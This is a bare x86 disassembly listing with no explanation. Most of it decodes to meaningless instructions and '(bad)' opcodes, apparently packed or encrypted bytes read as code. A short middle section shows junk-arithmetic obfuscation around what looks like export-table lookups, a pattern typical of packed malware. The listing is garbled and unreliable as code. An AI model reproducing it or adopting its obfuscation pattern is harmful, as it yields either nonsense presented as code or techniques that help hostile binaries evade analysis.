  40a744:	sub    ebx,DWORD PTR [ebx]
  40a746:	loop   0x40a73a
  40a748:	push   esp
  40a749:	(bad)  
  40a74a:	adc    ebp,ebx
  40a74c:	adc    ch,bh
  40a74e:	dec    ebp
  40a74f:	dec    eax
  40a750:	add    ebx,DWORD PTR [ebp+0x6881fccf]
  40a756:	(bad)  
  40a757:	ror    DWORD PTR [edi],cl
  40a759:	bound  ecx,QWORD PTR [esi+0x37]
  40a75c:	mov    ecx,0xb1b03590
  40a761:	loope  0x40a712
  40a763:	neg    BYTE PTR [edi]
  40a765:	or     al,0xe7
  40a767:	(bad)  
  40a768:	mov    dl,0x50
  40a76a:	lods   al,BYTE PTR ds:[esi]
  40a76b:	shr    DWORD PTR [eax+ebx*8-0x80],cl
  40a76f:	sub    eax,eax
  40a771:	xchg   edi,eax
  40a772:	aas    
  40a773:	mov    edx,0x949533db
  40a778:	mov    ds:0x103dc621,al
  40a77d:	mov    ds:0xf156ff12,al
  40a782:	(bad)  
  40a783:	rcl    BYTE PTR ds:0x84e5ce23,cl
  40a789:	in     eax,dx
  40a78a:	cli    
  40a78b:	adc    eax,0x6be133eb
  40a790:	and    ch,BYTE PTR [ecx+edi*4]
  40a793:	mov    edx,0x49710bb1
  40a798:	in     al,dx
  40a799:	push   ebp
  40a79a:	(bad)  
  40a79b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a79c:	push   es
  40a79d:	cmp    ah,BYTE PTR [ebp-0x27b57b11]
  40a7a3:	retf   
  40a7a4:	inc    esi
  40a7a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7a6:	inc    ecx
  40a7a7:	cmp    eax,0x6a27a4f2
  40a7ac:	idiv   BYTE PTR [ebx+ebp*2]
  40a7af:	ret    
  40a7b0:	jnp    0x40a815
  40a7b2:	xchg   DWORD PTR [ebp+0x67],ebp
  40a7b5:	jp     0x40a80b
  40a7b7:	popf   
  40a7b8:	mov    dl,BYTE PTR [ebp-0x3abcd1c7]
  40a7be:	cmp    DWORD PTR [edi],eax
  40a7c0:	es scas eax,DWORD PTR es:[edi]
  40a7c2:	(bad)  [eax]
  40a7c4:	pop    ss
  40a7c5:	jae    0x40a7e2
  40a7c7:	sar    BYTE PTR [eax+0x2d6dc6a3],cl
  40a7cd:	enter  0xd51e,0x58
  40a7d1:	hlt    
  40a7d2:	and    ecx,DWORD PTR [edi]
  40a7d4:	add    ah,BYTE PTR [ebp+0x52]
  40a7d7:	add    eax,0x9b40de32
  40a7dc:	fabs   
  40a7de:	fisub  WORD PTR [edi]
  40a7e0:	mov    dl,0x22
  40a7e2:	dec    eax
  40a7e3:	lock inc bh
  40a7e6:	pop    eax
  40a7e7:	loopne 0x40a7c3
  40a7e9:	add    BYTE PTR [ebx-0x6a89050f],al
  40a7ef:	mov    esp,0x6ffb1534
  40a7f4:	push   es
  40a7f5:	sbb    DWORD PTR [eax+0x22],0x74ce1006
  40a7fc:	shl    DWORD PTR ds:0xc7b3f686,1
  40a802:	test   eax,0xe28cd24f
  40a807:	or     DWORD PTR [eax+0x1824d60c],eax
  40a80d:	inc    edx
  40a80e:	jo     0x40a869
  40a810:	pop    eax
  40a811:	outs   dx,DWORD PTR ds:[esi]
  40a812:	psubw  mm2,QWORD PTR [ecx+0x4d07be86]
  40a819:	cmp    edi,ebp
  40a81b:	dec    esi
  40a81c:	jmp    DWORD PTR [ecx+0x44f06396]
  40a822:	add    bl,BYTE PTR [edx-0x6f8862cb]
  40a828:	adc    cl,BYTE PTR ds:[ecx+0x1f]
  40a82c:	add    DWORD PTR [edx-0x27],eax
  40a82f:	mov    esi,0x7da4defb
  40a834:	dec    eax
  40a835:	out    0xb5,eax
  40a837:	xchg   ebx,eax
  40a838:	jo     0x40a818
  40a83a:	jnp    0x40a7cb
  40a83c:	and    DWORD PTR [esi],ebp
  40a83e:	adc    BYTE PTR [esi+0x44],bh
  40a841:	lock out dx,al
  40a843:	pushf  
  40a844:	outs   dx,DWORD PTR ds:[esi]
  40a845:	add    eax,ecx
  40a847:	cmp    BYTE PTR [edx+edi*2],ch
  40a84a:	jns    0x40a888
  40a84c:	(bad)  
  40a84d:	outs   dx,BYTE PTR ds:[esi]
  40a84e:	loop   0x40a8b2
  40a850:	add    BYTE PTR [edi+esi*2+0x53bdce9a],ch
  40a857:	jl     0x40a8a8
  40a859:	xor    edi,DWORD PTR [edi+edi*1]
  40a85c:	(bad)  
  40a85d:	fadd   DWORD PTR [ebx-0x1e593b3a]
  40a863:	jo     0x40a80c
  40a865:	or     BYTE PTR [esi-0x2e],al
  40a868:	iret   
  40a869:	sub    al,0x41
  40a86b:	push   ss
  40a86c:	dec    ebp
  40a86d:	push   edx
  40a86e:	enter  0x2119,0xf
  40a872:	ins    DWORD PTR es:[edi],dx
  40a873:	outs   dx,BYTE PTR ds:[esi]
  40a874:	punpckhdq mm5,mm2
  40a877:	enter  0x5454,0x4a
  40a87b:	enter  0xa6d0,0x7b
  40a87f:	push   cs
  40a880:	push   edx
  40a881:	mov    dh,0x8f
  40a883:	test   eax,0x15f772df
  40a888:	sbb    dl,BYTE PTR [ebx-0x71596926]
  40a88e:	push   ebp
  40a88f:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40a891:	pop    ecx
  40a892:	and    DWORD PTR [ecx-0x48c87b98],ecx
  40a898:	enter  0x6255,0x1e
  40a89c:	mov    al,ds:0x4e24e1f
  40a8a1:	popaw  
  40a8a3:	adc    BYTE PTR [esi+edi*1+0x3],dh
  40a8a7:	sbb    al,0xb1
  40a8a9:	inc    ecx
  40a8aa:	mov    dl,0x7f
  40a8ac:	lods   eax,DWORD PTR ds:[esi]
  40a8ad:	mov    al,ds:0xc4aa8fed
  40a8b2:	jns    0x40a8e8
  40a8b4:	loopne 0x40a8da
  40a8b6:	or     eax,0x96104759
  40a8bb:	push   es
  40a8bc:	sub    al,0xec
  40a8be:	xor    ch,bl
  40a8c0:	cli    
  40a8c1:	mov    ebx,0xe567e7b3
  40a8c6:	mov    esi,0x55fe0d28
  40a8cb:	lea    edx,[bx+si+0x5f]
  40a8cf:	xchg   DWORD PTR [ecx+0x64],esp
  40a8d2:	lahf   
  40a8d3:	fcom   DWORD PTR [ebx-0x13]
  40a8d6:	push   esi
  40a8d7:	mov    dh,BYTE PTR ds:0x78346533
  40a8dd:	lods   al,BYTE PTR ds:[esi]
  40a8de:	mov    ds:0x758a4412,eax
  40a8e3:	retf   0x7e67
  40a8e6:	add    DWORD PTR [esi-0x8321aaa],ebx
  40a8ec:	or     al,0x2f
  40a8ee:	mov    ds:0x393a87e3,al
  40a8f3:	into   
  40a8f4:	sbb    DWORD PTR [esi+edi*2-0x26d13d54],ebx
  40a8fb:	pushf  
  40a8fc:	add    eax,0x1b5d3b69
  40a901:	jle    0x40a8e6
  40a903:	xchg   esp,eax
  40a904:	jge    0x40a96e
  40a906:	cmp    bh,bh
  40a908:	fmul   DWORD PTR [edx+0x3d72a934]
  40a90e:	mov    ah,0xc9
  40a910:	cmp    bh,dl
  40a912:	dec    edx
  40a913:	scas   al,BYTE PTR es:[edi]
  40a914:	sbb    eax,0x51a3b9e4
  40a919:	cmp    al,0xea
  40a91b:	iret   
  40a91c:	xor    BYTE PTR [ebx-0x4a],al
  40a91f:	dec    edx
  40a920:	add    bl,cl
  40a922:	call   0xa7e0:0xb3489edc
  40a929:	sbb    dl,BYTE PTR [esi]
  40a92b:	sbb    esp,edx
  40a92d:	xor    BYTE PTR [esp+esi*4],cl
  40a930:	inc    esp
  40a931:	out    dx,eax
  40a932:	xchg   BYTE PTR [esi-0x68],dl
  40a935:	fdiv   DWORD PTR [ebx]
  40a937:	xchg   ebp,eax
  40a938:	or     al,0x61
  40a93a:	and    dh,bl
  40a93c:	xchg   esp,eax
  40a93d:	sub    al,0xd1
  40a93f:	mov    edi,0xd051ce8
  40a944:	push   ecx
  40a945:	inc    ecx
  40a946:	popa   
  40a947:	sub    al,0x50
  40a949:	cdq    
  40a94a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a94b:	jns    0x40a9c5
  40a94d:	pop    es
  40a94e:	and    dl,BYTE PTR [ebx-0x4724b5bb]
  40a954:	adc    eax,0xc4b787c9
  40a959:	pop    esp
  40a95a:	xchg   edx,eax
  40a95b:	and    ecx,edx
  40a95d:	cmp    DWORD PTR [edx-0x75171692],esi
  40a963:	dec    eax
  40a964:	(bad)  
  40a965:	std    
  40a966:	aaa    
  40a967:	lods   al,BYTE PTR ds:[esi]
  40a968:	add    eax,0xfa1ebb31
  40a96d:	xor    ebp,DWORD PTR [esi+0x4181b317]
  40a973:	hlt    
  40a974:	idiv   BYTE PTR [esi]
  40a976:	or     dl,ah
  40a978:	das    
  40a979:	shl    edi,0x48
  40a97c:	pop    ss
  40a97d:	(bad)  
  40a97e:	(bad)  
  40a97f:	mov    edi,0x85024963
  40a984:	in     eax,dx
  40a985:	pushf  
  40a986:	sar    edi,cl
  40a988:	test   al,0xeb
  40a98a:	pop    ss
  40a98b:	hlt    
  40a98c:	mov    al,0x68
  40a98e:	pop    es
  40a98f:	int    0x34
  40a991:	push   ebp
  40a992:	push   es
  40a993:	mov    al,ds:0x7fc17830
  40a998:	mov    dh,0xc4
  40a99a:	cdq    
  40a99b:	adc    eax,0x898f50c9
  40a9a0:	std    
  40a9a1:	int3   
  40a9a2:	ss (bad) 
  40a9a4:	xlat   BYTE PTR ds:[ebx]
  40a9a5:	aam    0x36
  40a9a7:	frstor [ecx+0x7e39bd9e]
  40a9ad:	sbb    al,0xce
  40a9af:	add    eax,0x39f2f639
  40a9b4:	fsub   QWORD PTR [esi+esi*2-0x67]
  40a9b8:	sbb    eax,0xf7a805e9
  40a9bd:	xchg   esp,eax
  40a9be:	jo     0x40a947
  40a9c0:	pop    ds
  40a9c1:	push   0x48
  40a9c3:	shl    DWORD PTR [esi],cl
  40a9c5:	out    dx,al
  40a9c6:	fs pushf 
  40a9c8:	sbb    DWORD PTR [ecx+0x321b6454],esi
  40a9ce:	push   ss
  40a9cf:	fisttp DWORD PTR [eax-0x7f]
  40a9d2:	push   0x50de52bb
  40a9d7:	and    eax,0xa0f95ae8
  40a9dc:	dec    esp
  40a9dd:	cmp    eax,DWORD PTR [eax+0x58272f4f]
  40a9e3:	pop    ebp
  40a9e4:	imul   esp,DWORD PTR [esi+0x64],0x8bc42dd2
  40a9eb:	sub    DWORD PTR [esi+edi*1-0x1a80bb6d],ecx
  40a9f2:	test   eax,0xded88796
  40a9f7:	das    
  40a9f8:	shr    BYTE PTR [ebp-0x36464e64],cl
  40a9fe:	cmp    bh,bh
  40aa00:	mov    ebx,edi
  40aa02:	pop    ebx
  40aa03:	push   0xffffffa0
  40aa05:	dec    eax
  40aa06:	mov    eax,ds:0x445124b8
  40aa0b:	sahf   
  40aa0c:	mov    dl,0x68
  40aa0e:	(bad)  
  40aa0f:	fwait
  40aa10:	aaa    
  40aa11:	dec    esp
  40aa12:	jae    0x40a994
  40aa14:	fild   WORD PTR [eax+edx*1]
  40aa17:	push   cs
  40aa18:	adc    edx,edx
  40aa1a:	cli    
  40aa1b:	jp     0x40aa72
  40aa1d:	nop
  40aa1e:	leave  
  40aa1f:	mov    ds:0xf12d6e0a,al
  40aa24:	push   ebx
  40aa25:	ror    DWORD PTR [ebp+0x23368375],1
  40aa2b:	inc    edi
  40aa2c:	or     BYTE PTR [edi-0x4e],bh
  40aa2f:	xacquire xchg BYTE PTR [ebp-0x18],cl
  40aa33:	enter  0x4005,0xed
  40aa37:	add    eax,0xec5798b
  40aa3c:	mov    ecx,0xa172015b
  40aa41:	cmc    
  40aa42:	adc    bl,BYTE PTR ds:0x30c3a773
  40aa48:	pop    ss
  40aa49:	jmp    0x40aa9e
  40aa4b:	jge    0x40aaa3
  40aa4d:	mov    ebx,0x15ce1b29
  40aa52:	mov    dl,BYTE PTR [ebp+0x7e]
  40aa55:	jne    0x40aa2a
  40aa57:	pop    edi
  40aa58:	loop   0x40aa0d
  40aa5a:	rcl    BYTE PTR [ecx],0x33
  40aa5d:	int    0x8
  40aa5f:	(bad)  
  40aa60:	mov    edx,0x3f4a0dfa
  40aa65:	and    DWORD PTR [ebp+ebp*1+0x6c],eax
  40aa69:	mov    bh,0x70
  40aa6b:	dec    eax
  40aa6c:	and    DWORD PTR [ecx+0x627cbdcf],edx
  40aa72:	mov    cl,bl
  40aa74:	lods   eax,DWORD PTR ds:[esi]
  40aa75:	jp     0x40aa02
  40aa77:	ja     0x40aa7e
  40aa79:	sub    al,0xd4
  40aa7b:	call   0x48c309b7
  40aa80:	jns    0x40aa4c
  40aa82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa83:	pop    ds
  40aa84:	into   
  40aa85:	xchg   ebx,eax
  40aa86:	mov    ebx,DWORD PTR [esi]
  40aa88:	data16 in al,0xa2
  40aa8b:	fcmove st,st(6)
  40aa8d:	mov    dh,0x66
  40aa8f:	fs mov dl,0x7b
  40aa92:	dec    esp
  40aa93:	mov    esi,0x5ac67acb
  40aa98:	std    
  40aa99:	jge    0x40aa82
  40aa9b:	scas   al,BYTE PTR es:[edi]
  40aa9c:	cmp    BYTE PTR [eax],0x86
  40aa9f:	or     eax,0x3f50eee8
  40aaa4:	adc    bl,BYTE PTR [eax-0x1a]
  40aaa7:	cmc    
  40aaa8:	add    dh,BYTE PTR [eax+0x4d]
  40aaab:	jp     0x40aa79
  40aaad:	pop    esp
  40aaae:	pushf  
  40aaaf:	mov    DWORD PTR [edi-0x168961d],ecx
  40aab5:	outs   dx,BYTE PTR ds:[esi]
  40aab6:	fs dec eax
  40aab8:	out    0xdf,eax
  40aaba:	bound  esi,QWORD PTR [edx+ebx*8+0x37]
  40aabe:	xchg   BYTE PTR [esi-0x2d],ch
  40aac1:	xchg   edi,eax
  40aac2:	sbb    BYTE PTR [edx],ch
  40aac4:	fwait
  40aac5:	rol    DWORD PTR [eax],0x93
  40aac8:	ins    BYTE PTR es:[edi],dx
  40aac9:	shl    edi,cl
  40aacb:	add    bh,BYTE PTR [edx]
  40aacd:	sar    DWORD PTR ds:0xf31f2522,1
  40aad3:	popa   
  40aad4:	repz adc eax,0xfbf8c85a
  40aada:	mov    ch,0x9c
  40aadc:	adc    ah,BYTE PTR [edi]
  40aade:	rcl    DWORD PTR ds:0x1796a639,0x8b
  40aae5:	lods   eax,DWORD PTR ds:[esi]
  40aae6:	rcl    DWORD PTR [ebx],1
  40aae8:	ror    BYTE PTR [edi+0x15],1
  40aaeb:	mov    dh,0x66
  40aaed:	inc    edi
  40aaee:	ins    BYTE PTR es:[edi],dx
  40aaef:	mov    WORD PTR [ecx-0x1f],cs
  40aaf2:	imul   esi,ebp,0xffffffad
  40aaf5:	mov    BYTE PTR [ebx+ebx*1-0x3ce40a61],ah
  40aafc:	pop    DWORD PTR [edi+ecx*8+0x3418b1f1]
  40ab03:	je     0x40aaed
  40ab05:	push   ebp
  40ab06:	in     eax,dx
  40ab07:	inc    ebp
  40ab08:	cmp    BYTE PTR [edi+0x536ed0a2],0xec
  40ab0f:	ret    0xc17a
  40ab12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab13:	cmp    eax,0xaae9d13a
  40ab18:	mov    dh,BYTE PTR [edx+0x14]
  40ab1b:	sub    eax,0xa67cc753
  40ab20:	lds    ebp,FWORD PTR [edi+0x1147e7b6]
  40ab26:	stc    
  40ab27:	bound  edx,QWORD PTR [esi]
  40ab29:	mov    esp,esi
  40ab2b:	ss add bl,dh
  40ab2e:	add    DWORD PTR ds:0x8c5be0be,eax
  40ab34:	adc    eax,0x4fdb67f6
  40ab39:	in     al,0x60
  40ab3b:	jae    0x40ab13
  40ab3d:	xchg   ebp,eax
  40ab3e:	pop    edi
  40ab3f:	call   0xa2e6:0x5c7ce33
  40ab46:	inc    edx
  40ab47:	add    BYTE PTR [edx+eax*1+0x0],dl
  40ab4b:	add    BYTE PTR [ebx],bh
  40ab4d:	enter  0x840f,0xbd
  40ab51:	and    eax,0x458b0000
  40ab56:	cld    
  40ab57:	and    DWORD PTR ds:0x42a28a,0x5384
  40ab61:	xor    eax,esi
  40ab63:	add    DWORD PTR ds:0x42a2fa,0x7b59
  40ab6d:	add    eax,edi
  40ab6f:	cmp    ebx,eax
  40ab71:	mov    DWORD PTR ds:0x42a2e6,0x2910
  40ab7b:	jne    0x40d0af
  40ab81:	xor    DWORD PTR ds:0x42a276,0x42a2d6
  40ab8b:	push   DWORD PTR [ebp+0x8]
  40ab8e:	call   0x42504a
  40ab93:	and    DWORD PTR ds:0x42a266,edi
  40ab99:	mov    DWORD PTR [ebp-0x14],eax
  40ab9c:	xor    ecx,ecx
  40ab9e:	xor    ecx,DWORD PTR ds:0x42a306
  40aba4:	mov    eax,ds:0x42a3a2
  40aba9:	sub    ecx,eax
  40abab:	or     ecx,DWORD PTR [ecx+eax*1]
  40abae:	mov    eax,DWORD PTR [ebp-0x4]
  40abb1:	sbb    ecx,0x17a4
  40abb7:	mov    ecx,DWORD PTR [ebp-0x14]
  40abba:	xor    DWORD PTR ds:0x42a28a,0x42a2a6
  40abc4:	xor    eax,esi
  40abc6:	add    eax,edi
  40abc8:	mov    DWORD PTR ds:0x42a25a,0x307a
  40abd2:	cmp    ecx,eax
  40abd4:	mov    DWORD PTR ds:0x42a2be,0xd4
  40abde:	je     0x40d1cc
  40abe4:	or     DWORD PTR ds:0x42a2c6,0x42a266
  40abee:	push   DWORD PTR [ebp-0x14]
  40abf1:	not    DWORD PTR ds:0x42a2a6
  40abf7:	push   DWORD PTR [ebp+0x8]
  40abfa:	sbb    DWORD PTR ds:0x42a2ae,0x3b6a
  40ac04:	call   0x42510a
  40ac09:	mov    DWORD PTR [ebp-0x14],eax
  40ac0c:	or     eax,DWORD PTR ds:0x42a2be
  40ac12:	mov    eax,DWORD PTR [ebp-0x4]
  40ac15:	mov    ecx,DWORD PTR [ebp-0x14]
  40ac18:	xor    eax,esi
  40ac1a:	and    DWORD PTR ds:0x42a2da,0x42a2fe
  40ac24:	add    eax,edi
  40ac26:	cmp    ecx,eax
  40ac28:	mov    DWORD PTR ds:0x42a2d6,0x7d26
  40ac32:	je     0x40d1cc
  40ac38:	xor    ecx,DWORD PTR ds:0x42a2ea
  40ac3e:	mov    eax,DWORD PTR [ebp-0x14]
  40ac41:	mov    eax,DWORD PTR [eax+0x18]
  40ac44:	or     DWORD PTR ds:0x42a29a,0x5e55
  40ac4e:	mov    DWORD PTR [ebp-0x24],eax
  40ac51:	xor    DWORD PTR ds:0x42a2be,ecx
  40ac57:	mov    eax,DWORD PTR [ebp-0x14]
  40ac5a:	and    DWORD PTR ds:0x42a2ee,0x0
  40ac64:	mov    ecx,DWORD PTR ds:0x42a2ee
  40ac6a:	inc    ecx
  40ac6b:	mov    DWORD PTR ds:0x42a2ee,ecx
  40ac71:	cmp    DWORD PTR ds:0x42a2ee,0x1f
  40ac78:	jb     0x40acb0
  40ac7e:	jmp    0x40aca3
  40ac83:	push   DWORD PTR [ebp-0x28]
  40ac86:	push   0x6caa
  40ac8b:	push   0x1820
  40ac90:	push   0x670f
  40ac95:	push   0x3854
  40ac9a:	push   DWORD PTR [ebp-0x24]
  40ac9d:	call   DWORD PTR ds:0x42a3c2
  40aca3:	cmp    DWORD PTR ds:0x42a2ee,0x14
  40acaa:	jb     0x40ac64
  40acb0:	mov    ecx,DWORD PTR [ebp+0x8]
  40acb3:	add    ecx,DWORD PTR [eax+0x20]
  40acb6:	movzx  eax,BYTE PTR ds:0x42a2e6
  40acbd:	adc    DWORD PTR ds:0x42a286,eax
  40acc3:	mov    DWORD PTR [ebp-0x2c],ecx
  40acc6:	adc    DWORD PTR ds:0x42a2b6,ecx
  40accc:	mov    eax,DWORD PTR [ebp-0x14]
  40accf:	sbb    ecx,DWORD PTR ds:0x42a262
  40acd5:	jmp    0x40d063
  40acda:	test   BYTE PTR fs:[esi],bl
  40acdd:	pop    es
  40acde:	sahf   
  40acdf:	and    DWORD PTR [edx-0x80],0x235b4cfa
  40ace6:	cmp    bl,bl
  40ace8:	ins    DWORD PTR es:[edi],dx
  40ace9:	rcr    DWORD PTR [eax-0x10],0x83
  40aced:	or     DWORD PTR [esi+ebx*2],0xffffff83
  40acf1:	and    DWORD PTR ds:0x2778fafb,0xffffff9e
  40acf8:	push   0xb1a633b8
  40acfd:	cmp    bl,cl
  40acff:	das    
  40ad00:	jg     0x40ad16
  40ad02:	add    eax,0x7b30140b
  40ad07:	fiadd  WORD PTR [eiz*8+0x7acb2483]
  40ad0e:	add    eax,0xa0ac1d77
  40ad13:	popa   
  40ad14:	xchg   esp,eax
  40ad15:	loopne 0x40ad88
  40ad17:	cmp    BYTE PTR [eax-0x77],al
  40ad1a:	sbb    ebp,ecx
  40ad1c:	(bad)  
  40ad1d:	(bad)  
  40ad1e:	adc    al,0x9d
  40ad20:	sahf   
  40ad21:	add    DWORD PTR [ebx],0x7f
  40ad24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad25:	retf   
  40ad26:	xchg   ecx,eax
  40ad27:	pop    es
  40ad28:	adc    DWORD PTR [bp+di],esi
  40ad2b:	syscall 
  40ad2d:	dec    esp
  40ad2e:	mov    ecx,0x7fccf7b1
  40ad33:	div    DWORD PTR [edi+0x68]
  40ad36:	xchg   esi,eax
  40ad37:	cld    
  40ad38:	xor    esi,DWORD PTR [edi-0x552e649d]
  40ad3e:	dec    esp
  40ad3f:	ror    DWORD PTR [eiz*4+0x2ba4f724],cl
  40ad46:	es jmp 0x3fbe:0x948ca10b
  40ad4e:	js     0x40acf5
  40ad50:	add    esi,DWORD PTR [ebx+0x1]
  40ad53:	loop   0x40ace2
  40ad55:	xchg   ebp,eax
  40ad56:	adc    eax,0x9ea816dd
  40ad5b:	mov    DWORD PTR [edi-0x15dbeecd],edx
  40ad61:	xor    BYTE PTR [esi-0x3e],cl
  40ad64:	adc    ah,BYTE PTR [ebx-0x51]
  40ad67:	cs xor al,0xd0
  40ad6a:	out    0xce,al
  40ad6c:	out    dx,al
  40ad6d:	les    eax,FWORD PTR [eax]
  40ad6f:	sar    DWORD PTR [edi+ebx*4],1
  40ad72:	popf   
  40ad73:	add    al,0x56
  40ad75:	or     bl,cl
  40ad77:	or     BYTE PTR [esi],al
  40ad79:	add    al,BYTE PTR [esi+ecx*8]
  40ad7c:	(bad)  
  40ad7d:	in     eax,dx
  40ad7e:	xor    DWORD PTR [ecx-0x8],ebp
  40ad81:	(bad)  
  40ad83:	repz xchg ebp,eax
  40ad85:	fdivr  DWORD PTR [edi+eax*8+0x41]
  40ad89:	push   di
  40ad8b:	pop    ds
  40ad8c:	mov    ch,BYTE PTR [ebp+0x360bbb1f]
  40ad92:	pop    esi
  40ad93:	sub    bh,BYTE PTR [edx+ebp*8+0x241556c5]
  40ad9a:	push   ebp
  40ad9b:	les    ecx,FWORD PTR [ecx-0x16]
  40ad9e:	and    cl,BYTE PTR [ebx]
  40ada0:	stc    
  40ada1:	lahf   
  40ada2:	inc    edi
  40ada3:	adc    BYTE PTR [ebp-0x48],0x3
  40ada7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ada8:	call   0x53e3b832
  40adad:	ds pushf 
  40adaf:	lds    ebp,FWORD PTR [ebx-0x27210fd1]
  40adb5:	xor    eax,0xc40e9842
  40adba:	xor    BYTE PTR [esi-0x60],ah
  40adbd:	jmp    0x97f9:0x8333b83
  40adc4:	mov    ecx,0x329cc96a
  40adc9:	shl    BYTE PTR [eax-0x5f1e2c64],0x3
  40add0:	(bad)  
  40add1:	pop    ss
  40add2:	push   edx
  40add3:	addr16 or ebp,edi
  40add6:	ret    
  40add7:	pusha  
  40add8:	jg     0x40adda
  40adda:	mov    ecx,0xb6a4de36
  40addf:	stos   BYTE PTR es:[edi],al
  40ade0:	mov    esp,0xb27f27b0
  40ade5:	jae    0x40ad86
  40ade7:	aas    
  40ade8:	jno    0x40ad7a
  40adea:	xor    edi,edi
  40adec:	test   eax,0x10b70df2
  40adf1:	cmp    ch,ch
  40adf3:	repz jp 0x40ae53
  40adf6:	mov    ebx,0xba019954
  40adfb:	cmp    ebp,esp
  40adfd:	mov    ebp,0x89aeb090
  40ae02:	add    edx,esi
  40ae04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae05:	ds mov eax,0xb460e17a
  40ae0b:	pushf  
  40ae0c:	jmp    0x40add5
  40ae0e:	and    DWORD PTR [edi+0x2eca0951],edi
  40ae14:	ficomp WORD PTR ds:0x4e6e22c8
  40ae1a:	cdq    
  40ae1b:	or     esi,DWORD PTR [edi+0x25]
  40ae1e:	ja     0x40adc1
  40ae20:	xchg   esi,eax
  40ae21:	stos   DWORD PTR es:[edi],eax
  40ae22:	imul   ebp,DWORD PTR [eax-0x2a],0x4
  40ae26:	mov    eax,ds:0x5062459e
  40ae2b:	inc    eax
  40ae2c:	(bad)  
  40ae2d:	mov    WORD PTR [edx+0x5760f1dc],fs
  40ae33:	mov    ebx,0x23a2aea1
  40ae38:	repz sbb dh,BYTE PTR [ebx]
  40ae3b:	in     al,dx
  40ae3c:	outs   dx,BYTE PTR ds:[esi]
  40ae3e:	pop    eax
  40ae3f:	mov    ebx,0x27f8f043
  40ae44:	adc    DWORD PTR [edi],ecx
  40ae46:	les    esi,FWORD PTR [edi]
  40ae48:	mov    edi,0x83653072
  40ae4d:	and    eax,0xc0c5f3b1
  40ae52:	notrack call esi
  40ae55:	xchg   ebx,eax
  40ae56:	mov    edi,DWORD PTR [edi+0x67]
  40ae59:	imul   BYTE PTR [edi]
  40ae5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae5c:	lods   al,BYTE PTR ds:[esi]
  40ae5d:	cmp    ebx,DWORD PTR [ecx]
  40ae5f:	arpl   WORD PTR [esi],bp
  40ae61:	lods   eax,DWORD PTR ds:[esi]
  40ae62:	icebp  
  40ae63:	pushf  
  40ae64:	pop    es
  40ae65:	xchg   dx,ax
  40ae67:	fcom   DWORD PTR [eax-0x1d10e3bb]
  40ae6d:	push   cs
  40ae6e:	imul   ebx,DWORD PTR [ebx+ebp*4],0xa14e0be2
  40ae75:	dec    ebx
  40ae76:	loopne 0x40ae29
  40ae78:	fninit 
  40ae7a:	in     al,dx
  40ae7b:	js     0x40aef3
  40ae7d:	jnp    0x40ae94
  40ae7f:	mov    ds:0x2de98ef4,al
  40ae84:	shl    BYTE PTR [edi-0x28],1
  40ae87:	shl    DWORD PTR [esi-0x43],1
  40ae8a:	sar    DWORD PTR [ecx+0x217d816b],0x2a
  40ae91:	inc    esp
  40ae92:	ss in  eax,dx
  40ae94:	outs   dx,BYTE PTR ds:[esi]
  40ae95:	pop    ss
  40ae96:	cli    
  40ae97:	push   0x22b0e9f2
  40ae9c:	xor    dl,BYTE PTR [esi-0x34]
  40ae9f:	cmp    ecx,DWORD PTR [ebp+ebx*4-0x726576c2]
  40aea6:	push   edx
  40aea7:	scas   eax,DWORD PTR es:[edi]
  40aea8:	dec    esi
  40aea9:	mov    esi,0x56dcb5ef
  40aeae:	mov    ds,eax
  40aeb0:	ret    
  40aeb1:	retf   0xde6d
  40aeb4:	push   esi
  40aeb5:	mov    dl,0xc0
  40aeb7:	pop    ss
  40aeb8:	clc    
  40aeb9:	adc    esi,DWORD PTR [ecx+eiz*2-0x35]
  40aebd:	and    eax,0x72c2da90
  40aec2:	das    
  40aec3:	jns    0x40aee3
  40aec5:	aaa    
  40aec6:	mov    bh,0x11
  40aec8:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40aeca:	repnz xchg eax,ecx
  40aecd:	jg     0x40ae94
  40aecf:	ins    BYTE PTR es:[edi],dx
  40aed0:	out    0xcb,eax
  40aed2:	jp     0x40ae79
  40aed4:	pop    esp
  40aed5:	dec    ecx
  40aed6:	call   0x5c98:0x3e7ebb6f
  40aedd:	sub    ah,ch
  40aedf:	cs pop eax
  40aee1:	xchg   ebx,eax
  40aee2:	cmp    al,0xfa
  40aee4:	mov    edx,0x196628bc
  40aee9:	and    dl,BYTE PTR [edi+0x13d97f18]
  40aeef:	loop   0x40af12
  40aef1:	adc    BYTE PTR [esi+ecx*1+0xf3ca918],ch
  40aef8:	aaa    
  40aef9:	xor    BYTE PTR [ebx+edi*2-0x45750db5],0x47
  40af01:	add    DWORD PTR [edi-0x1d88fe4e],ecx
  40af07:	cmp    al,0x22
  40af09:	(bad)  
  40af0a:	jecxz  0x40aee9
  40af0c:	out    0xf5,al
  40af0e:	jb     0x40aebf
  40af10:	jmp    0x40af54
  40af12:	xor    eax,0x428f94ab
  40af17:	imul   ebx,DWORD PTR [edx],0xdb4d14b2
  40af1d:	popa   
  40af1e:	in     al,dx
  40af1f:	inc    ebp
  40af20:	cmc    
  40af21:	xor    ebx,DWORD PTR [edx-0x7ca037b]
  40af27:	mov    ebx,0xd125ad30
  40af2c:	xchg   ecx,eax
  40af2d:	sub    edx,DWORD PTR [ecx]
  40af2f:	mov    edi,DWORD PTR [edx+0x72]
  40af32:	add    BYTE PTR [esi],dh
  40af34:	pop    ss
  40af35:	ret    0x433e
  40af38:	xlat   BYTE PTR ds:[ebx]
  40af39:	push   edx
  40af3a:	add    esp,edx
  40af3c:	pop    eax
  40af3d:	dec    ebx
  40af3e:	hlt    
  40af3f:	mov    cl,0x43
  40af41:	adc    DWORD PTR [esi],ebp
  40af43:	jp     0x40af6d
  40af45:	mov    esi,0x279fb73a
  40af4a:	xor    edx,DWORD PTR [ebp+0x77]
  40af4d:	sar    BYTE PTR ds:0xb464f0c7,1
  40af53:	dec    ebp
  40af54:	popa   
  40af55:	inc    ebp
  40af56:	add    ecx,DWORD PTR [eax+0x6b]
